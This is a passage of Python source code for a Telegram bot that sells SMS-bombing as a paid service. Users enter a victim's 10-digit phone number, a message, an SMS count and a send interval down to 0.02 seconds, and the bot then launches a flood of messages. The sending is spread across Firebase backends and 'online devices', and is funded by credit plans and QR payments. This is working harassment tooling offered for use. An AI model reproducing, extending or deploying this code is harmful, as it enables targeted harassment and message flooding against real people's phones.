              f"{B('You can also type /cancel to abort.')}")
    if update.callback_query:
        q = update.callback_query
        await q.answer()
        await q.message.reply_text(prompt)
    else:
        await update.message.reply_text(prompt)
    return TARGET

async def bomb_target(update, context):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear(); await button_handler(update, context); return ConversationHandler.END
    cleaned = text.replace(" ", "").replace("-", "").replace("+", "")
    if cleaned.startswith("91") and len(cleaned) in (11, 12):
        cleaned = cleaned[2:]
    if not cleaned.isdigit():
        await update.message.reply_text(
            f"❌ {B('Please enter a valid numeric phone number.')}\n{B('Example')}: {B('9876543210')}")
        return TARGET
    if len(cleaned) != 10:
        await update.message.reply_text(
            f"❌ {B('Please enter exactly 10 digits.')}\n{B('No country code needed.')}\n"
            f"{B('Example')}: {B('9876543210')}")
        return TARGET
    context.user_data["target"] = cleaned
    await update.message.reply_text(f"✏️ {B('Now enter the message you want to send:')}")
    return MESSAGE

async def bomb_message(update, context):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear(); await button_handler(update, context); return ConversationHandler.END
    context.user_data["message"] = text
    credits = get_user_credits(update.effective_user.id)
    await update.message.reply_text(
        f"📨 {B('How many SMS do you want to send?')}\n{LINE}\n"
        f"💳 {B('Your Credits')}: {B(str(credits))}\n"
        f"💡 {B('1 Credit = 1 SMS')}\n{LINE}\n"
        f"{B('Enter a number:')}")
    return SMS_COUNT

async def bomb_sms_count(update, context):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear(); await button_handler(update, context); return ConversationHandler.END
    try:
        count = int(text)
        if count <= 0: raise ValueError
    except:
        await update.message.reply_text(f"❌ {B('Please enter a positive integer.')}")
        return SMS_COUNT
    credits = get_user_credits(update.effective_user.id)
    if count > credits:
        await update.message.reply_text(
            f"⚠️ {B('You have only')} {B(str(credits))} {B('credits.')}\n"
            f"{B('Please enter a number up to')} {B(str(credits))} {B('or /cancel.')}")
        return SMS_COUNT
    context.user_data["sms_count"] = count
    kb = [
        [InlineKeyboardButton(f"🐢 {B('Slow (1s)')}", callback_data="speed_slow")],
        [InlineKeyboardButton(f"🐇 {B('Medium (0.5s)')}", callback_data="speed_medium")],
        [InlineKeyboardButton(f"🚀 {B('Fast (0.1s)')}", callback_data="speed_fast")],
        [InlineKeyboardButton(f"💥 {B('Lightning (0.02s)')}", callback_data="speed_lightning")],
    ]
    await update.message.reply_text(
        f"⚡ {B('SELECT SPEED')}\n{LINE}\n{B('Choose the sending speed:')}",
        reply_markup=InlineKeyboardMarkup(kb))
    return SPEED

async def bomb_speed(update, context):
    q = update.callback_query; await q.answer()
    d = q.data
    if d == "speed_slow": delay = 1.0
    elif d == "speed_medium": delay = 0.5
    elif d == "speed_fast": delay = 0.1
    elif d == "speed_lightning": delay = 0.02
    else: delay = 0.5
    context.user_data["delay"] = delay
    await q.message.reply_text(
        f"⏱️ {B('Delay set to')} {B(str(delay))}s.\n\n"
        f"🕒 {B('Send date/time in format YYYY-MM-DD HH:MM or now to send immediately.')}")
    return SCHEDULE

async def bomb_schedule(update, context):
    text = update.message.text.strip().lower()
    if text in ALL_BUTTONS:
        context.user_data.clear(); await button_handler(update, context); return ConversationHandler.END
    try:
        if text == "now": schedule_time = None
        else:
            try:
                schedule_time = datetime.strptime(text, "%Y-%m-%d %H:%M")
                if schedule_time <= datetime.now():
                    await update.message.reply_text(f"⚠️ {B('Scheduled time must be in future.')}")
                    return SCHEDULE
            except ValueError:
                await update.message.reply_text(f"❌ {B('Invalid format.')}")
                return SCHEDULE
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        target = context.user_data["target"]; message = context.user_data["message"]
        count = context.user_data["sms_count"]; delay = context.user_data["delay"]
        if get_user_credits(uid) < count:
            await update.message.reply_text(f"❌ {B('Insufficient credits.')}"); return ConversationHandler.END
        firebases = db_get_firebases()
        if not firebases:
            await update.message.reply_text(f"❌ {B('No Firebase configured.')}"); return ConversationHandler.END
        fb_ids = list(firebases.keys())
        job_id = str(uuid4())[:8]
        db_add_job(job_id, target, message, fb_ids, chat_id, count, delay, uid)
        task = asyncio.create_task(execute_bomb_job(job_id, target, message, fb_ids, count, delay, uid, schedule_time))
        running_jobs[job_id] = task
        sch = f"⏰ {B('Scheduled for')}: {B(schedule_time.strftime('%Y-%m-%d %H:%M'))}" if schedule_time else f"🚀 {B('Running now...')}"
        await update.message.reply_text(
            f"✅ {B('BOMB LAUNCHED!')} ✅\n{LINE}\n"
            f"📦 {B('Job ID')}: {B(job_id)}\n📞 {B('Target')}: {B(target)}\n"
            f"📨 {B('SMS Count')}: {B(str(count))}\n"
            f"💳 {B('Credits Used')}: {B(str(count))}\n"
            f"⚡ {B('Speed')}: {B(str(delay))}s\n{sch}\n{LINE}\n"
            f"📊 {B('Progress bar will appear shortly')} ✨")
        context.user_data.clear()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"bomb_schedule: {e}")
        await update.message.reply_text(f"❌ {B('Error')}: {B(str(e))}")
        return ConversationHandler.END

async def cancel_conversation(update, context):
    await update.message.reply_text(f"❌ {B('Operation cancelled.')}")
    return ConversationHandler.END

# ============================================================
# COMMANDS
# ============================================================
async def redeem_command(update, context):
    uid = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(f"🔑 {B('Usage')}: {B('/redeem <key>')}")
        return
    key = args[0].strip().upper()
    if db_redeem_key(key, uid):
        credits = get_user_credits(uid)
        await update.message.reply_text(
            f"🎟️ {B('KEY REDEEMED SUCCESSFULLY!')}\n{LINE}\n"
            f"💳 {B('You now have')} {B(str(credits))} {B('credits.')}\n{LINE}")
    else:
        await update.message.reply_text(f"❌ {B('Invalid key, already used, or expired.')}")

async def cancel_job_command(update, context):
    args = context.args
    if not args:
        await update.message.reply_text(f"{B('Usage')}: {B('/cancel <job_id>')}")
        return
    job_id = args[0]
    if job_id in running_jobs:
        running_jobs[job_id].cancel(); del running_jobs[job_id]
        db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
        await update.message.reply_text(f"✅ {B('Job')} {B(job_id)} {B('cancelled.')}")
    else:
        await update.message.reply_text(f"{B('Job not running.')}")

async def add_firebase_command(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS: await update.message.reply_text(f"⛔ {B('Unauthorized.')}"); return
    args = context.args
    if not args: await update.message.reply_text(f"{B('Usage')}: /addfb <url>"); return
    url = args[0].strip()
    if not url.startswith("http"): await update.message.reply_text(f"❌ {B('Invalid URL.')}"); return
    test = await firebase_request(url + "?shallow=true", "GET")
    if isinstance(test, dict) and test.get("_error"):
        await update.message.reply_text(f"❌ {B('Connection failed')}: {B(test.get('message','?'))}"); return
    fid = str(len(db_get_firebases()) + 1)
    db_add_firebase(fid, url, "")
    await update.message.reply_text(f"✅ {B('Firebase added with ID')} {B(fid)}")

async def delete_firebase_command(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS: await update.message.reply_text(f"⛔ {B('Unauthorized.')}"); return
    args = context.args
    if not args: await update.message.reply_text(f"{B('Usage')}: /deletefb <id>"); return
    fid = args[0].strip()
    if fid not in db_get_firebases(): await update.message.reply_text(f"❌ {B('Not found.')}"); return
    db_delete_firebase(fid)
    await update.message.reply_text(f"✅ {B('Firebase')} {B(fid)} {B('deleted.')}")

async def addkey_command(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS: await update.message.reply_text(f"⛔ {B('Unauthorized.')}"); return
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(f"🔑 {B('Usage')}: /addkey CODE MAXUSER CREDIT")
        return
    try:
        code = args[0].upper(); mu = int(args[1]); cr = int(args[2])
        if not code or mu <= 0 or cr <= 0: raise ValueError
    except:
        await update.message.reply_text(f"❌ {B('Invalid values.')}"); return
    ok, m = db_add_key(code, cr, mu, uid)
    if ok:
        await update.message.reply_text(f"🔑 {B('KEY GENERATED')}\n🎟️ {B(code)}\n💳 {B(str(cr))}\n♻️ {B(str(mu))}")
    else:
        await update.message.reply_text(f"❌ {B(m)}")

async def broadcast_command(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS: await update.message.reply_text(f"⛔ {B('Unauthorized.')}"); return
    if not context.args: await update.message.reply_text(f"📢 {B('Use')}: /broadcast <message>"); return
    text = " ".join(context.args)
    all_u = get_all_user_ids()
    bt = convert_broadcast_text(text)
    sent = 0; fail = 0
    for u in all_u:
        try:
            await BOT.send_message(u, bt); sent += 1; await asyncio.sleep(0.05)
        except: fail += 1
    await update.message.reply_text(f"✅ {B('Sent')}: {B(str(sent))} | ❌ {B(str(fail))}")

# ============================================================
# CALLBACK HANDLER
# ============================================================
async def callback_handler(update, context):
    q = update.callback_query; await q.answer()
    data = q.data
    uid = update.effective_user.id

    if data == "balance":
        c = get_user_credits(uid)
        await q.edit_message_text(f"💎 {B('BALANCE')}: {B(str(c))} {B('credits')}")
        return
    if data == "check_join":
        joined, missing = await check_channel_membership(uid, BOT)
        if joined:
            try: await q.edit_message_text(f"✅ {B('Verified!')}")
            except: pass
            await q.message.reply_text(f"✅ {B('Welcome!')}", reply_markup=get_main_keyboard(uid))
        else:
            try: await q.edit_message_text(f"❌ {B('Not joined yet. Try again.')}", reply_markup=get_join_keyboard())
            except: pass
        return
    if data == "show_plans" or data == "back_to_plans":
        plans = db_get_plans()
        TAG = {"starter": f"⚡ {B('Perfect for testing')}", "basic": f"🚀 {B('More power')}",
               "premium": f"⚡ {B('High performance')}", "ultimate": f"🚀 {B('Full access • No limits')}"}
        ICO = {"starter": "💠", "basic": "💎", "premium": "🔥", "ultimate": "👑"}
        text = f"💎 {B('BOT PLANS')} 📡✨\n\n"
        for p in plans:
            nk = p["name"].lower()
            icon = ICO.get(nk, "💎"); tag = TAG.get(nk, f"✨ {B('Great choice!')}")
            if p["credits"] >= 999999:
                text += (f"{LINE}\n\n{icon} {B(p['name'].upper())} {B('PLAN')}\n"
                         f"💰 {B(str(p['price']))}₹\n⏳ {B('1 MONTH VALIDITY')}\n"
                         f"♾️ {B('UNLIMITED')}\n{tag}\n\n")
            else:
                text += (f"{LINE}\n\n{icon} {B(p['name'].upper())} {B('PLAN')}\n"
                         f"💰 {B(str(p['price']))}₹\n🔍 {B(str(p['credits']))} {B('CREDITS')}\n{tag}\n\n")
        text += f"{LINE}\n\n{B('Choose a plan below to pay')}:"
        btns = [InlineKeyboardButton(f"💎 {B(p['name'])} - ₹{p['price']}", callback_data=f"plan_{i}") for i, p in enumerate(plans)]
        rows = [btns[i:i+2] for i in range(0, len(btns), 2)]
        try: await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(rows))
        except:
            try: await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(rows))
            except: pass
        return
    if data.startswith("plan_"):
        try:
            idx = int(data.split("_")[1])
            plans = db_get_plans()
            if idx < 0 or idx >= len(plans): return
            plan = plans[idx]
            pay_id = str(uuid4())[:8]
            pending_payments[uid] = pay_id
            payment_store[pay_id] = {"plan": plan, "uid": uid, "price": plan["price"],
                                      "label": plan["name"], "credits": plan["credits"]}
            caption = (f"💳 {B('PAYMENT REQUEST')}\n{LINE}\n\n"
                       f"📌 {B('PLAN')}: {B(plan['name'])}\n"
                       f"💰 {B('PRICE')}: ₹{B(str(plan['price']))}\n\n"
                       f"📸 {B('Upload screenshot and click DONE.')}")
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"✅ {B('Done (Upload screenshot)')}", callback_data=f"done_upload|{pay_id}")],
                [InlineKeyboardButton(f"🔙 {B('Back')}", callback_data="back_to_plans")],
            ])
            qr = get_qr_photo()
            try: await q.message.delete()
            except: pass
            if qr:
                await q.message.chat.send_photo(photo=qr, caption=caption, reply_markup=kb)
            else:
                await q.message.chat.send_message(caption + f"\n\n⚠️ {B('QR not set. Contact admin.')}", reply_markup=kb)
        except Exception as e: logger.error(f"plan cb: {e}")
        return
    if data.startswith("done_upload"):
        try: pay_id = data.split("|")[1]
        except: pay_id = pending_payments.get(uid)
        if pay_id: pending_payments[uid] = pay_id
        await q.message.reply_text(f"📸 {B('Upload screenshot now.')}")
        return
    if data.startswith("apv|"):
        if uid not in ADMIN_IDS: await q.answer("Unauthorized", show_alert=True); return
        pay_id = data.split("|")[1]
        if pay_id in processed_payments: await q.answer(B("Already processed!"), show_alert=True); return
        pay = payment_store.get(pay_id)
        if not pay: await q.answer(B("Payment not found!"), show_alert=True); return
        processed_payments.add(pay_id)
        target_uid = pay["uid"]; plan_label = pay["label"]; credits = pay["credits"]
        if credits >= 999999:
            set_user_credits(target_uid, 999999)
        else:
            update_user_credits(target_uid, credits)
        set_user_plan(target_uid, plan_label)
        new_bal = get_user_credits(target_uid)
        try:
            traces = f"🔍 {B('TRACES ADDED')}: {B('Unlimited') if credits >= 999999 else B(str(credits))}"
            await BOT.send_message(target_uid,
                f"✅ {B('PAYMENT APPROVED')}\n\n"
                f"💎 {B('PLAN')}: {B(plan_label)}\n{traces}")
        except: pass
        await q.answer(B("Approved!"), show_alert=True)
        try:
            await q.message.edit_caption(caption=(q.message.caption or "") + f"\n\n✅ {B('APPROVED')}", reply_markup=None)
        except: pass
        return
    if data.startswith("dcl|"):
        if uid not in ADMIN_IDS: await q.answer("Unauthorized", show_alert=True); return
        pay_id = data.split("|")[1]
        if pay_id in processed_payments: await q.answer(B("Already processed!"), show_alert=True); return
        pay = payment_store.get(pay_id)
        if not pay: await q.answer(B("Payment not found!"), show_alert=True); return
        processed_payments.add(pay_id)
        try:
            await BOT.send_message(pay["uid"],
                f"❌ {B('PAYMENT DECLINED')}\n{LINE}\n{B('Contact admin.')}")
        except: pass
        await q.answer(B("Declined!"), show_alert=True)
        try:
            await q.message.edit_caption(caption=(q.message.caption or "") + f"\n\n❌ {B('DECLINED')}", reply_markup=None)
        except: pass
        return
    if data == "back_main":
        try: await q.edit_message_text(f"🔙 {B('Back')}", reply_markup=get_main_keyboard(uid))
        except: pass
        return
    if data == "redeem_key":
        context.user_data["awaiting_redeem"] = True
        try: await q.edit_message_text(f"🔑 {B('Send the key')}")
        except: pass
        return
    if data == "gen_key":
        if uid not in ADMIN_IDS: await q.edit_message_text(f"⛔ {B('Unauthorized.')}"); return
        try: await q.edit_message_text(f"🔑 {B('Use /addkey CODE MAXUSER CREDIT')}")
        except: pass
        return
    if data == "devices": await show_devices_cb(q); return
    if data == "manage_fb": await manage_fb_cb(q); return
    if data == "add_fb":
        try: await q.edit_message_text(f"📝 {B('Use /addfb <url>')}")
        except: pass
        return
    if data.startswith("fb_delete_"):
        fid = data.split("_")[2]; db_delete_firebase(fid)
        try: await q.edit_message_text(f"✅ {B('Firebase')} {B(fid)} {B('deleted.')}")
        except: pass
        return
    if data.startswith("fb_test_"):
        fid = data.split("_")[2]
        fbs = db_get_firebases(); fb = fbs.get(fid)
        if not fb: await q.edit_message_text(f"❌ {B('Not found.')}"); return
        t = await firebase_request(fb["url"] + "?shallow=true", "GET")
        if isinstance(t, dict) and t.get("_error"):
            try: await q.edit_message_text(f"❌ {B('Failed')}: {B(t.get('message', '?'))}")
            except: pass
        else:
            try: await q.edit_message_text(f"✅ {B('Working!')}")
            except: pass
        return

async def show_devices_cb(q):
    firebases = db_get_firebases()
    if not firebases: await q.edit_message_text(f"{B('No Firebase.')}"); return
    text = f"📡 {B('ONLINE DEVICES')}\n{LINE}\n\n"
    total = 0
    for fid, d in firebases.items():
        try:
            devices = await get_online_devices(d["url"])
            cnt = len(devices); total += cnt
            icon = "🟢" if cnt > 0 else "🔴"
            text += f"{icon} {B('FB')} {B(fid)}: {B(str(cnt))}\n"
        except:
            text += f"🔴 {B('FB')} {B(fid)}: {B('Error')}\n"
    text += f"\n{LINE}\n📊 {B('Total')}: {B(str(total))}"
    await q.edit_message_text(text)

async def manage_fb_cb(q):
    firebases = db_get_firebases()
    text = f"⚙️ {B('MANAGE FIREBASES')}\n{LINE}\n\n"
    if not firebases: text += f"{B('No Firebase.')}\n"
    else:
        for fid, d in firebases.items(): text += f"• {B(fid)}: {B(d['url'])}\n"
    kb = []
    for fid in firebases.keys():
        kb.append([InlineKeyboardButton(f"{B('Test')} {B(fid)}", callback_data=f"fb_test_{fid}"),
                   InlineKeyboardButton(f"{B('Delete')} {B(fid)}", callback_data=f"fb_delete_{fid}")])
    kb.append([InlineKeyboardButton(f"🔙 {B('Back')}", callback_data="back_main")])
    await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

# ============================================================
# BUTTON HANDLER
# ============================================================
async def button_handler(update, context):
    user_id = update.effective_user.id

    # QR set photo handling
    if update.message.photo and context.user_data.get("admin_state") == "set_qr" and user_id in ADMIN_IDS:
        set_qr_photo(update.message.photo[-1].file_id)
        await update.message.reply_text(f"✅ {B('QR CODE SET')}", reply_markup=get_admin_panel_keyboard())
        context.user_data.pop("admin_state", None)
        return

    # Demo video set
    if update.message.video and context.user_data.get("admin_state") == "set_demo" and user_id in ADMIN_IDS:
        set_demo_video(update.message.video.file_id)
        await update.message.reply_text(f"✅ {B('DEMO VIDEO SET')}", reply_markup=get_admin_panel_keyboard())
        context.user_data.pop("admin_state", None)
        return

    # Broadcast photo/video
    if (update.message.photo or update.message.video) and context.user_data.get("admin_state") == "broadcast" and user_id in ADMIN_IDS:
        all_users = get_all_user_ids()
        cap = update.message.caption or ""
        bold_cap = convert_broadcast_text(cap) if cap else None
        st = await update.message.reply_text(f"📢 {B('Sending broadcast...')}")
        sent = 0; fail = 0
        for u in all_users:
            try:
                if update.message.photo:
                    await BOT.send_photo(u, update.message.photo[-1].file_id, caption=bold_cap)
                else:
                    await BOT.send_video(u, update.message.video.file_id, caption=bold_cap)
                sent += 1; await asyncio.sleep(0.05)
            except: fail += 1
        try: await st.edit_text(f"✅ {B('Delivered')}: {B(str(sent))} | ❌ {B(str(fail))}")
        except: pass
        context.user_data.pop("admin_state", None)
        return

    # User screenshot
    if update.message.photo and user_id not in ADMIN_IDS and user_id in pending_payments:
        pay_id = pending_payments[user_id]
        pay = payment_store.get(pay_id)
        if pay:
            uname = update.effective_user.username
            udisp = f"@{uname}" if uname else B("None")
            caption = (f"💰 {B('NEW PAYMENT REQUEST')}\n\n"
                       f"👤 {B('USER')}: {udisp}\n"
                       f"🆔 {B('ID')}: {B(str(user_id))}\n"
                       f"💎 {B('PLAN')}: {B(pay['label'])}\n"
                       f"💰 {B('AMOUNT')}: ₹{B(str(pay['price']))}")
            kb = InlineKeyboardMarkup([[InlineKeyboardButton(f"✅ {B('Approve')}", callback_data=f"apv|{pay_id}"),
                                        InlineKeyboardButton(f"❌ {B('Decline')}", callback_data=f"dcl|{pay_id}")]])
            for admin_id in ADMIN_IDS:
                try:
                    await BOT.send_photo(admin_id, update.message.photo[-1].file_id, caption=caption, reply_markup=kb)
                except Exception as e: logger.error(f"Send admin: {e}")
            await update.message.reply_text(f"✅ {B('Screenshot sent to admin. Wait for approval.')}")
            pending_payments.pop(user_id, None)
        return

    text = update.message.text if update.message.text else ""
    if not text: return

    if user_id not in ADMIN_IDS and is_suspended(user_id):
        await update.message.reply_text(f"🚫 {B('YOU ARE SUSPENDED')}")
        return

    if user_id not in ADMIN_IDS and get_maintenance():
        await update.message.reply_text(f"🛠 {B('UNDER MAINTENANCE')}\n{B('Please try again later.')}")
        return

    if user_id not in ADMIN_IDS and text not in ["/start", "/ping"]:
        joined, _ = await check_channel_membership(user_id, context.bot)
        if not joined:
            await update.message.reply_text(f"⚠️ {B('Please join our channel first!')}", reply_markup=get_join_keyboard())
            return

    if context.user_data.get("awaiting_redeem"):
        key = text.strip().upper()
        if db_redeem_key(key, user_id):
            credits = get_user_credits(user_id)
            await update.message.reply_text(f"🎟️ {B('KEY REDEEMED!')}\n💳 {B('Balance')}: {B(str(credits))}")
        else:
            await update.message.reply_text(f"❌ {B('Invalid key.')}")
        context.user_data.pop("awaiting_redeem", None)
        return

    # ADMIN STATE FLOWS
    state = context.user_data.get("admin_state")
    if user_id in ADMIN_IDS and state and text not in ALL_BUTTONS:
        if state == "message_user":
            parts = text.split('\n', 1)
            if len(parts) == 2:
                try:
                    tid = int(parts[0].strip()); msg = parts[1].strip()
                    await BOT.send_message(tid, f"✉️ {B('MESSAGE FROM ADMIN')}\n{LINE}\n\n{B(msg)}")
                    await update.message.reply_text(f"✅ {B('Sent to')} {B(str(tid))}", reply_markup=get_admin_panel_keyboard())
                except: await update.message.reply_text(f"❌ {B('Failed.')}", reply_markup=get_admin_panel_keyboard())
            else: await update.message.reply_text(f"❌ {B('Format: ID then message on new line.')}")
            context.user_data.pop("admin_state", None); return
        if state == "check_user":
            try:
                tid = int(text.strip())
                doc = users_col.find_one({"user_id": tid})
                if doc:
                    plan = doc.get("plan", "None"); cred = doc.get("credits", 0)
                    await update.message.reply_text(
                        f"🔍 {B('USER DETAILS')}\n{LINE}\n🆔 {B('ID')}: {B(str(tid))}\n"
                        f"💳 {B('Credits')}: {B(str(cred))}\n💎 {B('Plan')}: {B(plan)}",
                        reply_markup=get_admin_panel_keyboard())
                else:
                    await update.message.reply_text(f"❌ {B('User not found.')}", reply_markup=get_admin_panel_keyboard())
            except: await update.message.reply_text(f"❌ {B('Invalid ID.')}")
            context.user_data.pop("admin_state", None); return
        if state == "suspend":
            try:
                tid = int(text.strip())
                if tid in ADMIN_IDS: await update.message.reply_text(f"❌ {B('Cannot suspend admin.')}")
                elif suspend_user(tid):
                    await update.message.reply_text(f"🚫 {B('Suspended')}: {B(str(tid))}", reply_markup=get_admin_panel_keyboard())
                    try: await BOT.send_message(tid, f"🚫 {B('YOU HAVE BEEN SUSPENDED')}")
                    except: pass
                else: await update.message.reply_text(f"⚠️ {B('Already suspended.')}")
            except: await update.message.reply_text(f"❌ {B('Invalid ID.')}")
            context.user_data.pop("admin_state", None); return
        if state == "unsuspend":
            try:
                tid = int(text.strip())
                if unsuspend_user(tid):
                    await update.message.reply_text(f"✅ {B('Unsuspended')}: {B(str(tid))}", reply_markup=get_admin_panel_keyboard())
                    try: await BOT.send_message(tid, f"✅ {B('YOU HAVE BEEN UNSUSPENDED')}")
                    except: pass
                else: await update.message.reply_text(f"⚠️ {B('Not suspended.')}")
            except: await update.message.reply_text(f"❌ {B('Invalid ID.')}")
            context.user_data.pop("admin_state", None); return
        if state == "force_channel":
            ch = text.strip().replace("@", "").replace("https://t.me/", "").replace("t.me/", "")
            if not ch or " " in ch:
                await update.message.reply_text(f"❌ {B('Invalid channel.')}")
            else:
                try:
                    bm = await BOT.get_chat_member(f"@{ch}", BOT.id)
                    if bm.status not in ["administrator", "creator"]:
                        await update.message.reply_text(f"⚠️ {B('Bot is not admin in that channel!')}")
                    else:
                        set_force_channel(ch)
                        await update.message.reply_text(f"✅ {B('FORCE CHANNEL SET')}\n🔗 @{B(ch)}", reply_markup=get_admin_panel_keyboard())
                except Exception as e:
                    await update.message.reply_text(f"❌ {B('Channel not found or bot cannot access.')}", reply_markup=get_admin_panel_keyboard())
            context.user_data.pop("admin_state", None); return
        if state == "gen_key":
            parts = text.strip().split()
            if len(parts) != 3:
                await update.message.reply_text(f"❌ {B('Format: CODE MAXUSER CREDIT')}")
            else:
                try:
                    code = parts[0].strip().upper(); mu = int(parts[1]); cr = int(parts[2])
                    if not code or mu <= 0 or cr <= 0: raise ValueError
                    ok, m = db_add_key(code, cr, mu, user_id)
                    if ok:
                        await update.message.reply_text(
                            f"🔑 {B('KEY GENERATED')}\n{LINE}\n🎟️ {B('Code')}: {B(code)}\n"
                            f"💳 {B('Credits')}: {B(str(cr))}\n♻️ {B('Max Users')}: {B(str(mu))}\n{LINE}\n\n"
                            f"💡 {B('Users can redeem with')}: /redeem {B(code)}",
                            reply_markup=get_admin_panel_keyboard())
                    else:
                        await update.message.reply_text(f"❌ {B(m)}", reply_markup=get_admin_panel_keyboard())
                except: await update.message.reply_text(f"❌ {B('Invalid values.')}")
            context.user_data.pop("admin_state", None); return
        if state == "add_credit":
            parts = text.strip().split()
            if len(parts) == 2:
                try:
                    tid = int(parts[0]); amt = int(parts[1])
                    if amt <= 0: raise ValueError
                    get_user_credits(tid)
                    update_user_credits(tid, amt)
                    nb = get_user_credits(tid)
                    await update.message.reply_text(
                        f"✅ {B('CREDITS ADDED')}\n🆔 {B(str(tid))}\n➕ {B(str(amt))}\n💰 {B('New Balance')}: {B(str(nb))}",
                        reply_markup=get_admin_panel_keyboard())
                except: await update.message.reply_text(f"❌ {B('Invalid values.')}")
            else: await update.message.reply_text(f"❌ {B('Format: USER_ID CREDIT')}")
            context.user_data.pop("admin_state", None); return
        if state == "remove_credit":
            parts = text.strip().split()
            if len(parts) == 2:
                try:
                    tid = int(parts[0]); amt = int(parts[1])
                    if amt <= 0: raise ValueError
                    cur = get_user_credits(tid); rem = min(cur, amt)
                    update_user_credits(tid, -rem)
                    nb = get_user_credits(tid)
                    await update.message.reply_text(
                        f"✅ {B('CREDITS REMOVED')}\n🆔 {B(str(tid))}\n➖ {B(str(rem))}\n💰 {B('New Balance')}: {B(str(nb))}",
                        reply_markup=get_admin_panel_keyboard())
                except: await update.message.reply_text(f"❌ {B('Invalid values.')}")
            else: await update.message.reply_text(f"❌ {B('Format: USER_ID CREDIT')}")
            context.user_data.pop("admin_state", None); return
        if state == "add_plan":
            parts = [p.strip() for p in text.split(",")]
            if len(parts) == 3:
                try:
                    name = parts[0]; price = int(parts[1]); cr = int(parts[2])
                    if not name or price <= 0 or cr <= 0: raise ValueError
                    ok, m = db_add_plan(name, price, cr)
                    if ok: await update.message.reply_text(f"✅ {B('PLAN ADDED')}\n💎 {B(name)}\n💰 ₹{B(str(price))}\n🔢 {B(str(cr))}", reply_markup=get_admin_panel_keyboard())
                    else: await update.message.reply_text(f"❌ {B(m)}", reply_markup=get_admin_panel_keyboard())
                except: await update.message.reply_text(f"❌ {B('Invalid values.')}")
            else: await update.message.reply_text(f"❌ {B('Format: Name,Price,Credit')}")
            context.user_data.pop("admin_state", None); return
        if state == "edit_plan":
            parts = [p.strip() for p in text.split(",")]
            if len(parts) == 4:
                try:
                    old = parts[0]; new = parts[1]; price = int(parts[2]); cr = int(parts[3])
                    ok, m = db_update_plan(old, new, price, cr)
                    if ok: await update.message.reply_text(f"✅ {B('PLAN UPDATED')}", reply_markup=get_admin_panel_keyboard())
                    else: await update.message.reply_text(f"❌ {B(m)}", reply_markup=get_admin_panel_keyboard())
                except: await update.message.reply_text(f"❌ {B('Invalid values.')}")
            else: await update.message.reply_text(f"❌ {B('Format: OldName,NewName,Price,Credit')}")
            context.user_data.pop("admin_state", None); return
        if state == "delete_plan":
            ok, m = db_delete_plan(text.strip())
            if ok: await update.message.reply_text(f"✅ {B('PLAN DELETED')}", reply_markup=get_admin_panel_keyboard())
            else: await update.message.reply_text(f"❌ {B(m)}", reply_markup=get_admin_panel_keyboard())
            context.user_data.pop("admin_state", None); return
        if state == "set_support":
            u = text.strip().replace("@", "").replace("https://t.me/", "").replace("t.me/", "")
            if not u or " " in u: await update.message.reply_text(f"❌ {B('Invalid username.')}")
            else:
                set_support_username(u)
                await update.message.reply_text(f"✅ {B('SUPPORT SET')}: @{B(u)}", reply_markup=get_admin_panel_keyboard())
            context.user_data.pop("admin_state", None); return
        if state == "broadcast":
            all_users = get_all_user_ids()
            st = await update.message.reply_text(f"📢 {B('Sending...')}")
            bt = convert_broadcast_text(text)
            sent = 0; fail = 0
            for u in all_users:
                try:
                    await BOT.send_message(u, bt, disable_web_page_preview=False)
                    sent += 1; await asyncio.sleep(0.05)
                except: fail += 1
            try: await st.edit_text(f"✅ {B('BROADCAST SENT')}\n✅ {B(str(sent))} | ❌ {B(str(fail))}")
            except: pass
            context.user_data.pop("admin_state", None); return
        if state == "clear_db":
            if text.strip().upper() == "YES":
                try:
                    jobs_col.delete_many({}); firebases_col.delete_many({})
                    keys_col.delete_many({}); redemptions_col.delete_many({})
                    users_col.delete_many({"user_id": {"$nin": ADMIN_IDS}})
                    settings_col.delete_many({"key": {"$in": ["force_channel", "maintenance", "suspended_users", "demo_video", "qr_photo"]}})
                    running_jobs.clear(); progress_messages.clear()
                    pending_payments.clear(); payment_store.clear(); processed_payments.clear()
                    await update.message.reply_text(f"✅ {B('DATABASE CLEARED')}", reply_markup=get_admin_panel_keyboard())
                except Exception as e:
                    await update.message.reply_text(f"❌ {B(str(e))}", reply_markup=get_admin_panel_keyboard())
            else:
                await update.message.reply_text(f"❌ {B('Cancelled.')}", reply_markup=get_admin_panel_keyboard())
            context.user_data.pop("admin_state", None); return

    # MAIN MENU
    if text == f"💣 {B('LAUNCH BOMB')}":
        await bomb_wizard_start(update, context)
    elif text == f"🎬 {B('SEE DEMO')}":
        demo = get_demo_video()
        if demo:
            try: await update.message.reply_video(demo, caption=f"🎬 {B('DEMO VIDEO')}")
            except: await update.message.reply_text(f"❌ {B('Demo unavailable.')}")
        else:
            await update.message.reply_text(f"🎬 {B('Demo not available yet.')}")
    elif text == f"💳 {B('SUBSCRIPTION PLANS')}":
        await show_subscription_plans(update, context)
    elif text == f"👤 {B('MY ACCOUNT')}":
        await show_my_account(update, context)
    elif text == f"✉️ {B('HELP & SUPPORT')}":
        support = get_support_username()
        await update.message.reply_text(
            f"✉️ {B('HELP & SUPPORT')}\n{LINE}\n{B('Click the button below to contact support.')}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"💬 {B('Contact Support')}", url=f"https://t.me/{support}")]]))
    # ADMIN PANEL
    elif text == f"🔧 {B('ADMIN PANEL')}" and user_id in ADMIN_IDS:
        await update.message.reply_text(f"🔧 {B('ADMIN PANEL')}\n{LINE}\n{B('Choose an option:')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"🔑 {B('GENERATE KEY')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "gen_key"
